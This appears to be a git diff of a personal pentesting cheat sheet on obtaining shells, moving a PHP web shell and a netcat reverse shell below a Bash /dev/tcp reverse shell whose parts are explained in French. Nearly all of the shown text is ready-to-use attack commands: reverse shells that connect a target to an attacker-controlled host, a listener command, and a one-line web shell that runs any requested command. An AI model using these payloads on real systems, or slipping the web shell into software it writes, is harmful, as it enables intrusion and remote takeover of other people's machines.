@@ -7,18 +7,6 @@ description: I'll add way to get shells as i'll use them
 * Those lines are to use on the target, on the attacker we'll use `nc -lvpn <port>` to receive the connection.
 * Check [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for more example
 
-## PHP
-
-```php
-<?php
-    system($_REQUEST['cmd']);
-?>
-```
-
-## Netcat
-
-`nc -e /bin/bash <host> <port>`
-
 ## Bash
 
 ```bash
@@ -33,6 +21,18 @@ bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
 * `>&` Redirige STDOUT et STDERR du shell vers la connection
 * `0>&1` Redirige STDIN \(de la co\) vers STDOUT \(de la co je pense\)
 * `bash -c` permet de s'assurer que c'est bash et non un autre shell de la machine qui exécutera la commande, c'est nécessaire car /dev/tcp n'est fournit que par lui
+
+## PHP
+
+```php
+<?php
+    system($_REQUEST['cmd']);
+?>
+```
+
+## Netcat
+
+`nc -e /bin/bash <host> <port>`
 
 ## Node
 
